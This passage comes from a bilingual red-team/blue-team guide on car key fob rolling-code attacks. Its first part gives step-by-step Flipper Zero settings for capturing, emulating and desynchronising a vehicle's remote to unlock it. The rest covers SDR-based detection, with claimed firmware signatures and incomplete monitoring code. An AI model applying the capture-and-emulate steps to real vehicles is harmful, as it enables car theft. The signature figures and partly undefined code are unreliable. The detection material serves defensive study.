-<span class="w"> </span>Rechercher<span class="w"> </span>des<span class="w"> </span>informations<span class="w"> </span>sur<span class="w"> </span>le<span class="w"> </span><span class="nb">type</span><span class="w"> </span>de<span class="w"> </span>chiffrement<span class="w"> </span>utilis√©
-<span class="w"> </span>Pr√©parer<span class="w"> </span>le<span class="w"> </span>Flipper<span class="w"> </span>Zero<span class="w"> </span>avec<span class="w"> </span>firmware<span class="w"> </span>DarkWeb<span class="w"> </span>v3.5+
-<span class="w"> </span>Assurer<span class="w"> </span>une<span class="w"> </span>batterie<span class="w"> </span>compl√®tement<span class="w"> </span>charg√©e
-<span class="w"> </span>Pr√©parer<span class="w"> </span>l<span class="err">&#39;</span>antenne<span class="w"> </span>Sub-GHz<span class="w"> </span>optimis√©e<span class="w"> </span><span class="o">(</span>&gt;5dBi<span class="w"> </span>recommand√©<span class="o">)</span>
</code></pre></div>

<ol>
<li><strong>Capture du signal - M√©thode optimis√©e</strong></li>
</ol>
<div class="codehilite"><pre><span></span><code>Flipper<span class="w"> </span>Zero<span class="w"> </span>‚Üí<span class="w"> </span>SubGHz<span class="w"> </span>‚Üí<span class="w"> </span>Read<span class="w"> </span>RAW
-<span class="w"> </span>Fr√©quence<span class="w"> </span>:<span class="w"> </span><span class="m">433</span>.92<span class="w"> </span>MHz<span class="w"> </span><span class="o">(</span>ou<span class="w"> </span><span class="m">315</span><span class="w"> </span>MHz<span class="w"> </span>selon<span class="w"> </span>r√©gion<span class="o">)</span>
-<span class="w"> </span>Taux<span class="w"> </span>d<span class="s1">&#39;√©chantillonnage : 4MHz (sup√©rieur au standard)</span>
<span class="s1">- Mode d&#39;</span>amplitude<span class="w"> </span>:<span class="w"> </span>AM650<span class="w"> </span><span class="o">(</span>optimis√©<span class="w"> </span>pour<span class="w"> </span>t√©l√©commandes<span class="w"> </span>automobiles<span class="o">)</span>
-<span class="w"> </span>Se<span class="w"> </span>positionner<span class="w"> </span>√†<span class="w"> </span>une<span class="w"> </span>distance<span class="w"> </span>de<span class="w"> </span><span class="m">5</span>-15m<span class="w"> </span>du<span class="w"> </span>v√©hicule
-<span class="w"> </span>Demander<span class="w"> </span>au<span class="w"> </span>propri√©taire<span class="w"> </span>d<span class="err">&#39;</span>appuyer<span class="w"> </span>sur<span class="w"> </span>un<span class="w"> </span>bouton<span class="w"> </span>de<span class="w"> </span>sa<span class="w"> </span>t√©l√©commande
-<span class="w"> </span>Enregistrer<span class="w"> </span>le<span class="w"> </span>signal<span class="w"> </span>complet<span class="w"> </span><span class="o">(</span>un<span class="w"> </span>seul<span class="w"> </span>appui<span class="w"> </span>suffit<span class="o">)</span>
-<span class="w"> </span>Enregistrer<span class="w"> </span>sous<span class="w"> </span>un<span class="w"> </span>nom<span class="w"> </span>de<span class="w"> </span>fichier<span class="w"> </span>descriptif<span class="w"> </span><span class="o">(</span>ex:<span class="w"> </span><span class="s2">&quot;Jeep_Grand_Cherokee_2022_unlock.sub&quot;</span><span class="o">)</span>
</code></pre></div>

<ol>
<li><strong>Analyse et d√©codage</strong></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="c1"># V√©rification de la vuln√©rabilit√©</span>
Flipper<span class="w"> </span>Zero<span class="w"> </span>‚Üí<span class="w"> </span>SubGHz<span class="w"> </span>‚Üí<span class="w"> </span>DarkWeb<span class="w"> </span>Menu<span class="w"> </span>‚Üí<span class="w"> </span>RollJam<span class="w"> </span>Analysis
-<span class="w"> </span>Charger<span class="w"> </span>le<span class="w"> </span>signal<span class="w"> </span>captur√©
-<span class="w"> </span>Lancer<span class="w"> </span>l<span class="s1">&#39;analyse des codes tournants</span>
<span class="s1">- V√©rifier la compatibilit√© avec les exploits connus</span>
<span class="s1">- Si compatible, extraire le protocole et les param√®tres</span>
<span class="s1">- Identifier le fabricant de la puce de t√©l√©commande</span>
<span class="s1">- G√©n√©rer une cl√© d&#39;</span>√©mulation<span class="w"> </span>unique
</code></pre></div>

<ol>
<li><strong>Test d'√©mulation et v√©rification</strong></li>
</ol>
<div class="codehilite"><pre><span></span><code>Flipper<span class="w"> </span>Zero<span class="w"> </span>‚Üí<span class="w"> </span>SubGHz<span class="w"> </span>‚Üí<span class="w"> </span>DarkWeb<span class="w"> </span>Menu<span class="w"> </span>‚Üí<span class="w"> </span>RollCode<span class="w"> </span>Emulate
-<span class="w"> </span>S√©lectionner<span class="w"> </span>le<span class="w"> </span>signal<span class="w"> </span>analys√©
-<span class="w"> </span>Choisir<span class="w"> </span>la<span class="w"> </span>fonction<span class="w"> </span>√†<span class="w"> </span>√©muler<span class="w"> </span><span class="o">(</span>Lock/Unlock/Trunk<span class="o">)</span>
-<span class="w"> </span>Tester<span class="w"> </span>√†<span class="w"> </span>distance<span class="w"> </span>croissante<span class="w"> </span>du<span class="w"> </span>v√©hicule<span class="w"> </span>cibl√©<span class="w"> </span><span class="o">(</span>5m,<span class="w"> </span>10m,<span class="w"> </span>20m<span class="o">)</span>
-<span class="w"> </span>R√©p√©ter<span class="w"> </span>l<span class="s1">&#39;op√©ration 3 fois pour confirmer la fiabilit√©</span>
<span class="s1">- V√©rifier les fonctions d&#39;</span>√©mulation<span class="w"> </span>suppl√©mentaires<span class="w"> </span><span class="o">(</span>coffre,<span class="w"> </span>alarme,<span class="w"> </span>etc.<span class="o">)</span>
-<span class="w"> </span>Tenter<span class="w"> </span>un<span class="w"> </span>cycle<span class="w"> </span>complet<span class="w"> </span><span class="o">(</span>verrouillage<span class="w"> </span>puis<span class="w"> </span>d√©verrouillage<span class="o">)</span>
-<span class="w"> </span>Documenter<span class="w"> </span>chaque<span class="w"> </span>r√©sultat<span class="w"> </span>avec<span class="w"> </span>vid√©o
</code></pre></div>

<ol>
<li><strong>Test de d√©synchronisation</strong></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="c1"># V√©rification de l&#39;impact sur la t√©l√©commande d&#39;origine</span>
-<span class="w"> </span>Demander<span class="w"> </span>au<span class="w"> </span>propri√©taire<span class="w"> </span>d<span class="s1">&#39;utiliser sa t√©l√©commande apr√®s l&#39;</span>attaque
-<span class="w"> </span>Noter<span class="w"> </span>le<span class="w"> </span>nombre<span class="w"> </span>d<span class="s1">&#39;essais avant que la t√©l√©commande originale fonctionne √† nouveau</span>
<span class="s1">- Tester si l&#39;</span>√©mulation<span class="w"> </span>fonctionne<span class="w"> </span>encore<span class="w"> </span>apr√®s<span class="w"> </span>r√©synchronisation
-<span class="w"> </span>Documenter<span class="w"> </span>le<span class="w"> </span>comportement<span class="w"> </span>du<span class="w"> </span>syst√®me<span class="w"> </span>de<span class="w"> </span>s√©curit√©<span class="w"> </span>du<span class="w"> </span>v√©hicule
</code></pre></div>

<p><strong>Proc√©dure de v√©rification Blue Team :</strong></p>
<ol>
<li><strong>Configuration du syst√®me de surveillance</strong></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="c1"># Mise en place du moniteur RF ind√©pendant</span>
-<span class="w"> </span>Configurer<span class="w"> </span>un<span class="w"> </span>RTL-SDR<span class="w"> </span>avec<span class="w"> </span>GNU<span class="w"> </span>Radio
-<span class="w"> </span>Fr√©quence<span class="w"> </span>centrale<span class="w"> </span>:<span class="w"> </span><span class="m">433</span>.92<span class="w"> </span>MHz<span class="w"> </span><span class="o">(</span>ou<span class="w"> </span><span class="m">315</span><span class="w"> </span>MHz<span class="w"> </span>selon<span class="w"> </span>r√©gion<span class="o">)</span>
-<span class="w"> </span>Bande<span class="w"> </span>passante<span class="w"> </span>:<span class="w"> </span>2MHz<span class="w"> </span>minimum
-<span class="w"> </span>Enregistrer<span class="w"> </span>l<span class="s1">&#39;activit√© RF pendant toute la dur√©e du test</span>
<span class="s1">- Configurer l&#39;</span>analyse<span class="w"> </span>spectrale<span class="w"> </span>en<span class="w"> </span>temps<span class="w"> </span>r√©el
</code></pre></div>

<ol>
<li><strong>V√©rification de l'exploit</strong></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="c1"># M√©thodologie de validation Blue Team</span>
-<span class="w"> </span>Observer<span class="w"> </span>l<span class="s1">&#39;activit√© RF pendant la capture Red Team</span>
<span class="s1">- V√©rifier l&#39;</span>enregistrement<span class="w"> </span>et<span class="w"> </span>l<span class="s1">&#39;analyse du signal</span>
<span class="s1">- Confirmer que le signal captur√© est de qualit√© suffisante</span>
<span class="s1">- Observer le comportement du v√©hicule lors de l&#39;</span>√©mulation
-<span class="w"> </span>Valider<span class="w"> </span>la<span class="w"> </span>d√©synchronisation<span class="w"> </span>de<span class="w"> </span>la<span class="w"> </span>t√©l√©commande<span class="w"> </span>originale
</code></pre></div>

<ol>
<li><strong>D√©tection des marqueurs d'attaque</strong></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="c1"># Identification des indicateurs d&#39;exploitation</span>
-<span class="w"> </span>Capturer<span class="w"> </span>l<span class="s1">&#39;empreinte RF sp√©cifique de l&#39;</span>√©mulation<span class="w"> </span>DarkWeb
-<span class="w"> </span>Noter<span class="w"> </span>les<span class="w"> </span>diff√©rences<span class="w"> </span>avec<span class="w"> </span>l<span class="s1">&#39;√©mission l√©gitime</span>
<span class="s1">- Identifier les marqueurs de manipulation du code tournant</span>
<span class="s1">- Mesurer les temps d&#39;</span>√©mission<span class="w"> </span>par<span class="w"> </span>rapport<span class="w"> </span>aux<span class="w"> </span>normes
-<span class="w"> </span>D√©tecter<span class="w"> </span>les<span class="w"> </span>anomalies<span class="w"> </span>dans<span class="w"> </span>la<span class="w"> </span>s√©quence<span class="w"> </span>de<span class="w"> </span>code
</code></pre></div>

<p><strong>R√©sultats document√©s (Red Team &amp; Blue Team) :</strong></p>
<ul>
<li>Succ√®s/√©chec de l'exploitation pour chaque mod√®le test√©</li>
<li>Pourcentage de r√©ussite sur plusieurs essais (min. 10 tests)</li>
<li>Mesure de la distance maximale d'efficacit√© de l'exploitation</li>
<li>Impact exact sur la t√©l√©commande originale (nombre d'appuis n√©cessaires pour r√©synchroniser)</li>
<li>D√©lai avant r√©synchronisation automatique √©ventuelle</li>
<li>Marqueurs RF sp√©cifiques de l'attaque pour d√©tection future</li>
<li>Journalisation compl√®te avec horodatage pr√©cis</li>
<li>Preuve de concept vid√©o (pour documentation interne uniquement)</li>
</ul>
<h4 id="strategie-blue-team-detection-et-mitigation-avancee">üîµ Strat√©gie Blue Team : D√©tection et Mitigation Avanc√©e</h4>
<h3 id="blue-team-strategy-advanced-detection-and-mitigation">Blue Team Strategy: Advanced Detection and Mitigation</h3>
<p><strong>D√©tection technique d√©taill√©e pour les exploits de firmware personnalis√©s :</strong></p>
<ol>
<li><strong>Surveillance RF en temps r√©el</strong> - Impl√©mentation de syst√®mes de d√©tection RF avanc√©s :</li>
<li>
<p><strong>Mat√©riel n√©cessaire :</strong></p>
<ul>
<li>R√©cepteurs SDR (Software Defined Radio) comme HackRF, RTL-SDR ou YARD Stick One</li>
<li>Antennes directionnelles 433.92 MHz et 315 MHz</li>
<li>Logiciel d'analyse spectrale (GQRX, GNU Radio, Universal Radio Hacker)</li>
</ul>
</li>
<li>
<p><strong>Configuration sp√©cifique pour la d√©tection des firmwares exploitant les t√©l√©commandes :</strong>
   ```bash
   # Configuration du SDR pour d√©tection DarkWeb
   rtl_433 -f 433.92M -H 60 -s 2M -R 0 -A -a</p>
</li>
</ol>
<p># D√©tection des anomalies avec GNU Radio
   osmocom_fft -a hackrf -f 433.92M -s 8M --fft-rate=30 --peak-hold
   ```</p>
<ol>
<li>
<p><strong>Signatures des exploits par firmware</strong> - Marqueurs sp√©cifiques √† d√©tecter :</p>
</li>
<li>
<p><strong>DarkWeb Firmware :</strong></p>
<ul>
<li>R√©p√©titions anormales du pr√©ambule (4-5 fois contre 2-3 normalement)</li>
<li>Dur√©e d'√©mission plus longue (&gt;300ms contre 150-200ms normalement)</li>
<li>Structure de signal modifi√©e (bits de redondance manquants)</li>
<li>Fr√©quence l√©g√®rement d√©cal√©e (+/- 100kHz de la fr√©quence standard)</li>
</ul>
</li>
<li>
<p><strong>RollBack Firmware :</strong></p>
<ul>
<li>Impulsions de d√©synchronisation rapides avant le signal principal</li>
<li>Motifs de r√©p√©tition non standard (4-7-4 contre 3-3-3 normalement)</li>
<li>Pr√©sence de blocs de donn√©es sp√©cifiques "0xFE" dans l'en-t√™te</li>
</ul>
</li>
<li>
<p><strong>KeyMaster/RogueMaster :</strong></p>
<ul>
<li>Tentatives s√©quentielles multiples (brute force) √† intervalles pr√©cis (400ms)</li>
<li>Signatures d'amplification non lin√©aire dans le signal</li>
<li>Transmission sur plusieurs canaux parall√®les</li>
</ul>
</li>
<li>
<p><strong>D√©tection par apprentissage automatique</strong> - Impl√©mentation de mod√®les d'IA pour identifier les signaux anormaux :
   ```bash
   # Installation des d√©pendances pour le syst√®me de d√©tection par IA
   pip install tensorflow scipy numpy matplotlib scikit-learn</p>
</li>
</ol>
<p># Ex√©cution du mod√®le avec r√©f√©rence √† la base de signatures l√©gitimes
   python rf_anomaly_detector.py --source rtlsdr --freq 433.92e6 --model cnn_vehicle_model.h5
   ```</p>
<ol>
<li><strong>Forensique RF pour analyse post-incident</strong> - Configuration d'un syst√®me d'enregistrement permanent :
   <code>bash
   # Enregistrement continu pour analyse forensique
   rtl_sdr -f 433.92e6 -s 2048k -g 40 - | sox -t raw -r 2048k -b 8 -e unsigned -c 1 - parking_monitoring.wav</code></li>
</ol>
<p><strong>Surveillance des anomalies et d√©tection physique :</strong></p>
<ol>
<li><strong>Int√©gration √† la vid√©osurveillance</strong> - Corr√©lation entre signaux RF et activit√© physique :</li>
<li>Syst√®me de d√©tection pour les √©v√©nements suivants :</li>
<li>Ouverture/fermeture du v√©hicule sans pr√©sence physique d'une personne avec cl√©</li>
<li>Tentatives multiples de d√©verrouillage dans un court laps de temps</li>
<li>D√©synchronisation soudaine de t√©l√©commandes l√©gitimes</li>
<li>
<p>Pr√©sence d'individus utilisant des dispositifs √©lectroniques √† proximit√© des v√©hicules</p>
</li>
<li>
<p><strong>D√©tection des anomalies du v√©hicule</strong> - Pour les v√©hicules √©quip√©s de t√©l√©matique :
   <code>bash
   # Analyse des journaux OBD-II pour d√©tecter les ouvertures anormales
   python obd2_analyzer.py --port /dev/ttyUSB0 --watch-pid 0x0102,0x0103 --alert-threshold 3</code></p>
</li>
<li>
<p><strong>D√©tection des dispositifs Flipper Zero actifs</strong> :</p>
</li>
<li>Installation de Bluetooth Low Energy (BLE) scanners</li>
<li>D√©tection des signatures RF sp√©cifiques des Flipper Zero actifs</li>
<li>Analyse de trafic pour identifier les signatures USB lors des connexions</li>
</ol>
<p>```bash
   # D√©tection de Flipper Zero via Bluetooth
   sudo bluetoothctl scan on | grep -E "Flipper|DarkFlipper|FZero"</p>
<p># Surveillance USB pour les signatures Flipper
   sudo usbmon -i | grep -E "03eb:2ff[0-9]"
   ```</p>
<p><strong>Exemple de code pour la d√©tection RF (Python) :</strong></p>
<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">RollingCodeMonitor</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">freq</span><span class="o">=</span><span class="mf">433.92e6</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span> <span class="o">=</span> <span class="n">rtlsdr</span><span class="o">.</span><span class="n">RtlSdr</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">sample_rate</span> <span class="o">=</span> <span class="mf">2.4e6</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">center_freq</span> <span class="o">=</span> <span class="n">freq</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">gain</span> <span class="o">=</span> <span class="s1">&#39;auto&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">baseline</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">establish_baseline</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">establish_baseline</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">samples</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">read_samples</span><span class="p">(</span><span class="mi">256</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">analyze_signal_features</span><span class="p">(</span><span class="n">samples</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">analyze_signal_features</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">samples</span><span class="p">):</span>
        <span class="c1"># Extrait les caract√©ristiques du signal pour comparaison future</span>
        <span class="n">power</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">samples</span><span class="p">)</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">psd</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">fft</span><span class="o">.</span><span class="n">fft</span><span class="p">(</span><span class="n">samples</span><span class="p">))</span><span class="o">**</span><span class="mi">2</span>
        <span class="n">peak_freq</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">argmax</span><span class="p">(</span><span class="n">psd</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;power&#39;</span><span class="p">:</span> <span class="n">power</span><span class="p">,</span> <span class="s1">&#39;peak_freq&#39;</span><span class="p">:</span> <span class="n">peak_freq</span><span class="p">,</span> <span class="s1">&#39;psd_shape&#39;</span><span class="p">:</span> <span class="n">psd</span><span class="p">[:</span><span class="mi">1024</span><span class="p">]}</span>

    <span class="k">def</span> <span class="nf">detect_anomalies</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">current</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">read_samples</span><span class="p">(</span><span class="mi">256</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
        <span class="n">features</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">analyze_signal_features</span><span class="p">(</span><span class="n">current</span><span class="p">)</span>

        <span class="c1"># D√©tecte les signatures sp√©cifiques √† DarkWeb</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_darkweb_signature</span><span class="p">(</span><span class="n">features</span><span class="p">):</span>
            <span class="k">return</span> <span class="s2">&quot;ALERTE: Signature DarkWeb d√©tect√©e!&quot;</span>

        <span class="c1"># D√©tecte les tentatives RollBack</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_rollback_attempt</span><span class="p">(</span><span class="n">current</span><span class="p">):</span>
            <span class="k">return</span> <span class="s2">&quot;ALERTE: Tentative d&#39;attaque RollBack en cours!&quot;</span>

        <span class="k">return</span> <span class="s2">&quot;Aucune anomalie d√©tect√©e&quot;</span>

    <span class="k">def</span> <span class="nf">is_darkweb_signature</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">features</span><span class="p">):</span>
        <span class="c1"># Impl√©mentation des r√®gles de d√©tection DarkWeb</span>
        <span class="n">power_anomaly</span> <span class="o">=</span> <span class="n">features</span><span class="p">[</span><span class="s1">&#39;power&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseline</span><span class="p">[</span><span class="s1">&#39;power&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mf">1.5</span>
        <span class="n">freq_shift</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="n">features</span><span class="p">[</span><span class="s1">&#39;peak_freq&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseline</span><span class="p">[</span><span class="s1">&#39;peak_freq&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">20</span>
        <span class="k">return</span> <span class="n">power_anomaly</span> <span class="ow">and</span> <span class="n">freq_shift</span>

    <span class="k">def</span> <span class="nf">is_rollback_attempt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">samples</span><span class="p">):</span>
        <span class="c1"># D√©tecte les impulsions rapides caract√©ristiques d&#39;une attaque RollBack</span>
        <span class="n">edges</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">diff</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">samples</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">samples</span><span class="p">))</span> <span class="o">*</span> <span class="mf">1.5</span><span class="p">)</span>
        <span class="n">edge_count</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">edges</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">timing</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">analyze_pulse_timing</span><span class="p">(</span><span class="n">edges</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">edge_count</span> <span class="o">&gt;</span> <span class="mi">30</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">has_suspicious_pattern</span><span class="p">(</span><span class="n">timing</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">has_suspicious_pattern</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">timing</span><span class="p">):</span>
        <span class="c1"># V√©rifie les motifs de r√©p√©tition suspects (4-7-4 pattern)</span>
        <span class="n">pattern</span> <span class="o">=</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span>  <span class="c1"># Motif caract√©ristique RollBack</span>
        <span class="c1"># Impl√©mentation de l&#39;algorithme de correspondance de motif</span>
        <span class="k">return</span> <span class="n">pattern_match_score</span><span class="p">(</span><span class="n">timing</span><span class="p">,</span> <span class="n">pattern</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">0.8</span>

<span class="c1"># Utilisation</span>
<span class="n">monitor</span> <span class="o">=</span> <span class="n">RollingCodeMonitor</span><span class="p">(</span><span class="n">freq</span><span class="o">=</span><span class="mf">433.92e6</span><span class="p">)</span>
<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">monitor</span><span class="o">.</span><span class="n">detect_anomalies</span><span class="p">()</span>
    <span class="k">if</span> <span class="s2">&quot;ALERTE&quot;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="n">send_notification</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</code></pre></div>

<p><strong>English :</strong></p>
<h3 id="blue-team-strategy-advanced-detection-and-mitigation_1">Blue Team Strategy: Advanced Detection and Mitigation</h3>
<p><strong>Technical detection details for custom firmware exploits:</strong></p>
<ol>
<li><strong>Real-time RF monitoring</strong> - Implementation of advanced RF detection systems:</li>
<li>
<p><strong>Required hardware:</strong></p>
<ul>
<li>Software Defined Radio (SDR) receivers like HackRF, RTL-SDR or YARD Stick One</li>
<li>Directional antennas for 433.92 MHz and 315 MHz</li>
<li>Spectrum analysis software (GQRX, GNU Radio, Universal Radio Hacker)</li>
</ul>
</li>
<li>
<p><strong>Specific configuration for detecting firmware exploiting key fobs:</strong>
   ```bash
   # SDR configuration for DarkWeb detection
   rtl_433 -f 433.92M -H 60 -s 2M -R 0 -A -a</p>
</li>
</ol>
<p># Anomaly detection with GNU Radio
   osmocom_fft -a hackrf -f 433.92M -s 8M --fft-rate=30 --peak-hold
   ```</p>
<ol>
<li>
<p><strong>Firmware-specific exploit signatures</strong> - Specific markers to detect:</p>
</li>
<li>
<p><strong>DarkWeb Firmware:</strong></p>
<ul>
<li>Abnormal preamble repetitions (4-5 times vs 2-3 normally)</li>
<li>Longer emission duration (&gt;300ms vs 150-200ms normally)</li>
<li>Modified signal structure (missing redundancy bits)</li>
<li>Slightly shifted frequency (+/- 100kHz from standard frequency)</li>
</ul>
</li>
<li>
<p><strong>RollBack Firmware:</strong></p>
<ul>
<li>Fast desynchronization pulses before the main signal</li>
<li>Non-standard repetition patterns (4-7-4 vs 3-3-3 normally)</li>
<li>Presence of specific "0xFE" data blocks in the header</li>
</ul>
</li>
<li>
<p><strong>KeyMaster/RogueMaster:</strong></p>
<ul>
<li>Multiple sequential attempts (brute force) at precise intervals (400ms)</li>
<li>Non-linear amplification signatures in the signal</li>
<li>Transmission on multiple parallel channels</li>
</ul>
</li>
<li>
<p><strong>Machine learning detection</strong> - Implementation of AI models to identify anomalous signals:
   ```bash
   # Installation of dependencies for AI detection system
   pip install tensorflow scipy numpy matplotlib scikit-learn</p>
</li>
</ol>
<p># Running the model with reference to legitimate signature database
   python rf_anomaly_detector.py --source rtlsdr --freq 433.92e6 --model cnn_vehicle_model.h5
   ```</p>
<ol>
<li><strong>RF forensics for post-incident analysis</strong> - Configuration of a permanent recording system:
   <code>bash
   # Continuous recording for forensic analysis
   rtl_sdr -f 433.92e6 -s 2048k -g 40 - | sox -t raw -r 2048k -b 8 -e unsigned -c 1 - parking_monitoring.wav</code></li>
</ol>
<p><strong>Anomaly monitoring and physical detection:</strong></p>
<ol>
<li><strong>Video surveillance integration</strong> - Correlation between RF signals and physical activity:</li>
<li>Detection system for the following events:</li>
<li>Vehicle opening/closing without physical presence of a person with key</li>
<li>Multiple unlocking attempts in a short time period</li>
<li>Sudden desynchronization of legitimate key fobs</li>
<li>
<p>Presence of individuals using electronic devices near vehicles</p>
</li>
<li>
<p><strong>Vehicle anomaly detection</strong> - For vehicles equipped with telematics:
   <code>bash
   # OBD-II log analysis to detect abnormal openings
   python obd2_analyzer.py --port /dev/ttyUSB0 --watch-pid 0x0102,0x0103 --alert-threshold 3</code></p>
</li>
<li>
<p><strong>Detection of active Flipper Zero devices</strong>:</p>
</li>
<li>Installation of Bluetooth Low Energy (BLE) scanners</li>
<li>Detection of RF signatures specific to active Flipper Zero</li>
<li>Traffic analysis to identify USB signatures during connections</li>
</ol>
<p>```bash
   # Flipper Zero detection via Bluetooth
   sudo bluetoothctl scan on | grep -E "Flipper|DarkFlipper|FZero"</p>
<p># USB monitoring for Flipper signatures
   sudo usbmon -i | grep -E "03eb:2ff[0-9]"
   ```</p>
<p><strong>Example code for RF detection (Python):</strong></p>
<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">RollingCodeMonitor</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">freq</span><span class="o">=</span><span class="mf">433.92e6</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span> <span class="o">=</span> <span class="n">rtlsdr</span><span class="o">.</span><span class="n">RtlSdr</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">sample_rate</span> <span class="o">=</span> <span class="mf">2.4e6</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">center_freq</span> <span class="o">=</span> <span class="n">freq</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">gain</span> <span class="o">=</span> <span class="s1">&#39;auto&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">baseline</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">establish_baseline</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">establish_baseline</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">samples</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sdr</span><span class="o">.</span><span class="n">read_samples</span><span class="p">(</span><span class="mi">256</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">analyze_signal_features</span><span class="p">(</span><span class="n">samples</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">analyze_signal_features</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">samples</span><span class="p">):</span>
        <span class="c1"># Extract signal features for future comparison</span>
        <span class="n">power</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">samples</span><span class="p">)</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">psd</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">fft</span><span class="o">.</span><span class="n">fft</span><span class="p">(</span><span class="n">samples</span><span class="p">))</span><span class="o">**</span><span class="mi">2</span>
        <span class="n">peak_freq</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">argmax</span><span class="p">(</span><span class="n">psd</span><span class="p">)</span>
